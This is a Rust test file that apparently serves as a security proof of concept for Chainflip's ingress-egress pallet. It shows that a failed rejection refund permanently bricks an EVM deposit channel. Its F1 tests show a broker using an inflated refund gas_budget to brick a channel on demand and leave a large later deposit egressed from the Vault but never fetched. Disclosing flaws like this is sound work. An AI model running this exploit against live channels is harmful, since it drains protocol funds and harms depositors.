//! PoC: a failed rejection refund permanently bricks an EVM deposit channel.
//!
//! `on_finalize` -> `get_fetch_id(&tx)` mutates `DepositChannelLookup` from
//! `Undeployed` to `Pending` *before* `try_broadcast_rejection_refund` runs.
//! The hook is not wrapped in a storage layer, so when the refund then fails
//! (`BelowDustLimit`) no fetch broadcast is ever created and the channel is
//! stuck with `can_fetch() == false` forever.

use crate::{
	advance_blocks,
	swapping::{setup_pool_and_accounts, OrderType},
	witness_call,
};
use cf_chains::{
	address::{AddressDerivationApi, EncodedAddress},
	assets::eth::Asset as EthAsset,
	eth::EthereumTrackedData,
	evm::{DeploymentStatus, DepositDetails},
	ChainState, ChannelRefundParametersForChain, Ethereum,
};
use cf_primitives::{AccountId, Asset, AssetAmount, IngressOrEgress};
use cf_traits::{AdjustedFeeEstimationApi, AssetConverter};
use frame_support::assert_ok;
use cf_test_utilities::assert_has_matching_event;
use pallet_cf_ingress_egress::{
	BroadcastAction, BroadcastActions, ChannelIdCounter, FetchOrTransfer, RefundFailureReason, DepositChannelLookup, DepositWitness, FailedRejections, PalletConfigUpdate,
	ScheduledEgressFetchOrTransfer,
};
use cf_amm::math::Price;
use sp_core::{H160, H256};
use state_chain_runtime::{
	chainflip::address_derivation::AddressDerivation, EthereumChainTracking,
	EthereumIngressEgress, EthereumInstance, Runtime, RuntimeCall, RuntimeEvent, RuntimeOrigin,
	Swapping,
};

const ZION: AccountId = AccountId::new([0x22; 32]);
const DUST_TX: H256 = H256([0x11; 32]);

fn has_fetch_for(addr: H160) -> bool {
	ScheduledEgressFetchOrTransfer::<Runtime, EthereumInstance>::get().iter().any(|f| {
		matches!(f, FetchOrTransfer::Fetch { deposit_address, .. } if *deposit_address == addr)
	})
}

fn has_finalise_fetch_for(addr: H160) -> bool {
	BroadcastActions::<Runtime, EthereumInstance>::iter_values().any(|a| {
		matches!(a, BroadcastAction::FinaliseFetch(addrs) if addrs.contains(&addr))
	})
}

fn run(reject: bool) {
	super::genesis::with_test_defaults().build().execute_with(|| {
		// Real pools so the gas fee can be converted into the deposit asset.
		setup_pool_and_accounts(vec![Asset::Eth], OrderType::LimitOrder);

		// Realistic gas price.
		witness_call(RuntimeCall::EthereumChainTracking(
			pallet_cf_chain_tracking::Call::update_chain_state {
				new_chain_state: ChainState::<Ethereum> {
					block_height: 1,
					tracked_data: EthereumTrackedData {
						base_fee: 1_000_000_000u128,
						priority_fee: 1_000_000u128,
					},
				},
			},
		));

		let fee_in_asset = |ingress_or_egress| {
			Swapping::calculate_input_for_gas_output::<Ethereum>(
				EthAsset::Usdc,
				EthereumChainTracking::estimate_fee(EthAsset::Usdc, ingress_or_egress),
			)
		};
		let total_fees: AssetAmount = fee_in_asset(IngressOrEgress::IngressDepositChannel)
			.saturating_add(fee_in_asset(IngressOrEgress::Egress));
		assert!(total_fees > 0, "fee conversion must be live");

		// Mainnet-like: a minimum deposit that the combined fees can reach.
		// On mainnet today Tron USDT fees are already 86% of the minimum deposit.
		assert_ok!(EthereumIngressEgress::update_pallet_config(
			pallet_cf_governance::RawOrigin::GovernanceApproval.into(),
			vec![PalletConfigUpdate::<Runtime, EthereumInstance>::SetMinimumDeposit {
				asset: EthAsset::Usdc,
				minimum_deposit: total_fees,
			}]
			.try_into()
			.unwrap(),
		));

		// Broker opens a swap deposit channel for USDC.
		assert_ok!(Swapping::request_swap_deposit_address_with_affiliates(
			RuntimeOrigin::signed(ZION),
			Asset::Usdc,
			Asset::Eth,
			EncodedAddress::Eth([0x02; 20]),
			0,
			None,
			0u16,
			Default::default(),
			ChannelRefundParametersForChain::<Ethereum> {
				retry_duration: 5,
				refund_address: H160([100u8; 20]),
				min_price: Price::zero(),
				refund_ccm_metadata: None,
				max_oracle_price_slippage: None,
			}
			.map_address(|addr| EncodedAddress::Eth(addr.0)),
			None,
		));
		let deposit_address =
			<AddressDerivation as AddressDerivationApi<Ethereum>>::generate_address(
				EthAsset::Usdc,
				ChannelIdCounter::<Runtime, EthereumInstance>::get(),
			)
			.unwrap();

		assert_eq!(
			DepositChannelLookup::<Runtime, EthereumInstance>::get(deposit_address)
				.unwrap()
				.deposit_channel
				.state,
			DeploymentStatus::Undeployed,
		);

		if reject {
			// The broker marks the incoming transaction for rejection.
			assert_ok!(EthereumIngressEgress::mark_transaction_for_rejection(
				RuntimeOrigin::signed(ZION),
				DUST_TX,
			));
		}

		// Deposit clears MinimumDeposit but cannot cover ingress + egress fees.
		witness_call(RuntimeCall::EthereumIngressEgress(
			pallet_cf_ingress_egress::Call::process_deposits {
				deposit_witnesses: vec![DepositWitness {
					deposit_address,
					asset: EthAsset::Usdc,
					amount: total_fees,
					deposit_details: DepositDetails { tx_hashes: Some(vec![DUST_TX]) },
				}],
				block_height: 1,
			},
		));

		// Run the rejection in `on_finalize`.
		advance_blocks(3);

		let state = DepositChannelLookup::<Runtime, EthereumInstance>::get(deposit_address)
			.unwrap()
			.deposit_channel
			.state;

		if !reject {
			// Control: the same small deposit is fetched normally and a FinaliseFetch
			// broadcast proves deployment.
			assert_eq!(state, DeploymentStatus::Pending);
			assert!(!has_fetch_for(deposit_address), "control: fetch was dispatched");
			assert!(has_finalise_fetch_for(deposit_address), "control: FinaliseFetch exists");
			println!("CONTROL OK: fetch dispatched, FinaliseFetch broadcast recorded");
			return;
		}

		// The refund failed with BelowDustLimit ...
		assert_has_matching_event!(
			Runtime,
			RuntimeEvent::EthereumIngressEgress(
				pallet_cf_ingress_egress::Event::TransactionRejectionFailed {
					reason: RefundFailureReason::BelowDustLimit,
					..
				}
			)
		);
		assert_eq!(FailedRejections::<Runtime, EthereumInstance>::get().len(), 1);
		// ... yet the channel was already moved to `Pending`, with no fetch broadcast.
		assert_eq!(state, DeploymentStatus::Pending);
		assert!(!has_finalise_fetch_for(deposit_address));
		println!("dust deposit {total_fees} rejected -> BelowDustLimit; channel state = {state:?}");

		// A later legitimate deposit is credited on the State Chain ...
		let big: AssetAmount = 1_000_000_000_000;
		witness_call(RuntimeCall::EthereumIngressEgress(
			pallet_cf_ingress_egress::Call::process_deposits {
				deposit_witnesses: vec![DepositWitness {
					deposit_address,
					asset: EthAsset::Usdc,
					amount: big,
					deposit_details: DepositDetails { tx_hashes: Some(vec![H256([0x22; 32])]) },
				}],
				block_height: 2,
			},
		));
		assert_has_matching_event!(
			Runtime,
			RuntimeEvent::EthereumIngressEgress(pallet_cf_ingress_egress::Event::DepositFinalised {
				amount,
				..
			}) if *amount == big
		);

		// ... but its fetch into the Vault never happens, however long we wait.
		advance_blocks(200);
		assert!(has_fetch_for(deposit_address), "fetch is stuck");
		assert!(!has_finalise_fetch_for(deposit_address));
		assert_eq!(
			DepositChannelLookup::<Runtime, EthereumInstance>::get(deposit_address)
				.unwrap()
				.deposit_channel
				.state,
			DeploymentStatus::Pending,
		);
		println!("credited {big} on State Chain; fetch still pending after 200 blocks: channel bricked");
	});
}

#[test]
fn failed_rejection_refund_permanently_bricks_deposit_channel() {
	run(true);
}

#[test]
fn control_same_deposit_without_rejection_is_fetched() {
	run(false);
}

// ============================================================================
// F1: attacker-controlled refund_ccm_metadata.gas_budget forces the brick
// ON DEMAND at normal (1 gwei) gas — no gas spike, no governance override of
// the fee, any broker. Also demonstrates the scaled unbacked fee-swap drain
// and the egress-without-fetch Vault shortfall.
// ============================================================================

use cf_chains::CcmChannelMetadataUnchecked;
use pallet_cf_asset_balances::WithheldAssets;

const ATK: AccountId = AccountId::new([0x33; 32]);

fn open_ccm_swap_channel(gas_budget: AssetAmount) -> H160 {
	// A broker opens a normal USDC->ETH swap channel, but sets an attacker-chosen
	// refund CCM with an inflated gas_budget. gas_budget is never bounded by
	// to_checked / validate_refund_params.
	assert_ok!(Swapping::request_swap_deposit_address_with_affiliates(
		RuntimeOrigin::signed(ATK),
		Asset::Usdc,
		Asset::Eth,
		EncodedAddress::Eth([0x02; 20]),
		0,
		None,
		0u16,
		Default::default(),
		ChannelRefundParametersForChain::<Ethereum> {
			retry_duration: 5,
			refund_address: H160([0x64; 20]),
			min_price: Price::zero(),
			refund_ccm_metadata: Some(CcmChannelMetadataUnchecked {
				message: vec![0x01].try_into().unwrap(),
				gas_budget,
				ccm_additional_data: Default::default(),
			}),
			max_oracle_price_slippage: None,
		}
		.map_address(|addr| EncodedAddress::Eth(addr.0)),
		None,
	));
	<AddressDerivation as AddressDerivationApi<Ethereum>>::generate_address(
		EthAsset::Usdc,
		ChannelIdCounter::<Runtime, EthereumInstance>::get(),
	)
	.unwrap()
}

fn set_min_deposit(amount: AssetAmount) {
	assert_ok!(EthereumIngressEgress::update_pallet_config(
		pallet_cf_governance::RawOrigin::GovernanceApproval.into(),
		vec![PalletConfigUpdate::<Runtime, EthereumInstance>::SetMinimumDeposit {
			asset: EthAsset::Usdc,
			minimum_deposit: amount,
		}]
		.try_into()
		.unwrap(),
	));
}

fn normal_gas() {
	// Realistic mainnet gas: 1 gwei base, 0.001 gwei priority. NO spike.
	witness_call(RuntimeCall::EthereumChainTracking(
		pallet_cf_chain_tracking::Call::update_chain_state {
			new_chain_state: ChainState::<Ethereum> {
				block_height: 1,
				tracked_data: EthereumTrackedData {
					base_fee: 1_000_000_000u128,
					priority_fee: 1_000_000u128,
				},
			},
		},
	));
}

#[test]
fn f1_ccm_gas_budget_bricks_on_demand_at_normal_gas() {
	super::genesis::with_test_defaults().build().execute_with(|| {
		setup_pool_and_accounts(vec![Asset::Eth], OrderType::LimitOrder);
		crate::network::new_account(&ATK, cf_primitives::AccountRole::Broker);
		normal_gas();

		// Mainnet-realistic $20 USDC minimum deposit.
		const MIN: AssetAmount = 20_000_000;
		set_min_deposit(MIN);

		// MAX_GAS_LIMIT on Ethereum is 10_000_000 gas; this clamps there.
		let addr = open_ccm_swap_channel(10_000_000);

		assert_eq!(
			DepositChannelLookup::<Runtime, EthereumInstance>::get(addr)
				.unwrap().deposit_channel.state,
			DeploymentStatus::Undeployed,
		);

		// Attacker marks the incoming deposit tx for rejection (own channel).
		assert_ok!(EthereumIngressEgress::mark_transaction_for_rejection(
			RuntimeOrigin::signed(ATK),
			DUST_TX,
		));

		// A deposit that CLEARS the $20 minimum — this is NOT dust.
		witness_call(RuntimeCall::EthereumIngressEgress(
			pallet_cf_ingress_egress::Call::process_deposits {
				deposit_witnesses: vec![DepositWitness {
					deposit_address: addr,
					asset: EthAsset::Usdc,
					amount: MIN,
					deposit_details: DepositDetails { tx_hashes: Some(vec![DUST_TX]) },
				}],
				block_height: 1,
			},
		));

		advance_blocks(3);

		// The inflated CCM egress fee ate the whole deposit -> BelowDustLimit,
		// at 1 gwei, with the deposit well above the minimum. On-demand brick.
		assert_has_matching_event!(
			Runtime,
			RuntimeEvent::EthereumIngressEgress(
				pallet_cf_ingress_egress::Event::TransactionRejectionFailed {
					reason: RefundFailureReason::BelowDustLimit, ..
				}
			)
		);
		let state = DepositChannelLookup::<Runtime, EthereumInstance>::get(addr)
			.unwrap().deposit_channel.state;
		assert_eq!(state, DeploymentStatus::Pending);
		assert!(!has_finalise_fetch_for(addr));
		println!("F1: $20 deposit at 1 gwei bricked on demand via gas_budget; state={state:?}");
	});
}

#[test]
fn f1_fee_drain_is_fee_sized_and_egress_without_fetch_is_the_scalable_loss() {
	super::genesis::with_test_defaults().build().execute_with(|| {
		setup_pool_and_accounts(vec![Asset::Eth], OrderType::LimitOrder);
		crate::network::new_account(&ATK, cf_primitives::AccountRole::Broker);
		normal_gas();

		const MIN: AssetAmount = 20_000_000; // $20 realistic mainnet min
		set_min_deposit(MIN);
		let addr = open_ccm_swap_channel(10_000_000);
		let withheld_before = WithheldAssets::<Runtime>::get(Asset::Eth);

		// Brick on demand with a deposit at the minimum.
		assert_ok!(EthereumIngressEgress::mark_transaction_for_rejection(
			RuntimeOrigin::signed(ATK), DUST_TX,
		));
		witness_call(RuntimeCall::EthereumIngressEgress(
			pallet_cf_ingress_egress::Call::process_deposits {
				deposit_witnesses: vec![DepositWitness {
					deposit_address: addr, asset: EthAsset::Usdc, amount: MIN,
					deposit_details: DepositDetails { tx_hashes: Some(vec![DUST_TX]) },
				}],
				block_height: 1,
			},
		));
		advance_blocks(5);

		assert_eq!(
			DepositChannelLookup::<Runtime, EthereumInstance>::get(addr)
				.unwrap().deposit_channel.state,
			DeploymentStatus::Pending,
		);
		// CORRECTION: the unbacked fee-swap is FEE-SIZED (capped by MAX_GAS_LIMIT),
		// not deposit-sized. ~25 USDC of gas asset accrued from the unfetched $20.
		let fee_drain = WithheldAssets::<Runtime>::get(Asset::Eth).saturating_sub(withheld_before);
		println!("F1 fee-drain per brick (unbacked gas asset): {fee_drain} (~fee-sized, not scalable)");

		// The SCALABLE loss: a later large deposit (NOT marked) to the bricked
		// channel is swapped + egressed from the Vault but never fetched.
		const BIG: AssetAmount = 100_000_000_000; // 100,000 USDC
		witness_call(RuntimeCall::EthereumIngressEgress(
			pallet_cf_ingress_egress::Call::process_deposits {
				deposit_witnesses: vec![DepositWitness {
					deposit_address: addr, asset: EthAsset::Usdc, amount: BIG,
					deposit_details: DepositDetails { tx_hashes: Some(vec![H256([0x55; 32])]) },
				}],
				block_height: 2,
			},
		));
		assert_has_matching_event!(
			Runtime,
			RuntimeEvent::EthereumIngressEgress(
				pallet_cf_ingress_egress::Event::DepositFinalised { amount, .. }
			) if *amount == BIG
		);
		advance_blocks(200);
		// BIG is credited/swapped on the State Chain but its fetch is stuck forever.
		assert!(has_fetch_for(addr), "the 100k USDC fetch is permanently stuck");
		assert!(!has_finalise_fetch_for(addr));
		assert_eq!(
			DepositChannelLookup::<Runtime, EthereumInstance>::get(addr)
				.unwrap().deposit_channel.state,
			DeploymentStatus::Pending,
		);
		println!("F1 scalable loss: 100,000 USDC egressed from Vault, never fetched; channel bricked");
	});
}
